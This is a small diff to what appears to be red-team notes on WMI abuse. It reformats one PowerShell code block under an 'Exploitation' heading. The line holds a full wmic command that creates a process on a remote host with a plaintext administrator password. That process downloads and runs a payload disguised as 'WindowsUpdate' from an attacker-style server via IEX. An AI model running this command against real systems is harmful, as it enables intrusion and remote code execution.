@@ -20,8 +20,7 @@ WMI is loved by adversaries since it can be used as a trigger based mechanism to
 ## Exploitation 
 
 ```powershell
-    shell wmic /NODE:fs01 /user:"FS01\Administrator" /password: "sup3rs3cr3tP@ssw0rd!!" process call create "powershell IEX ((new-object net.webclient).downloadstring('http://10.130.4.100:8888/WindowsUpdate'))"
-
+shell wmic /NODE:fs01 /user:"FS01\Administrator" /password: "sup3rs3cr3tP@ssw0rd!!" process call create "powershell IEX ((new-object net.webclient).downloadstring('http://10.130.4.100:8888/WindowsUpdate'))"
 ```
 
 ---
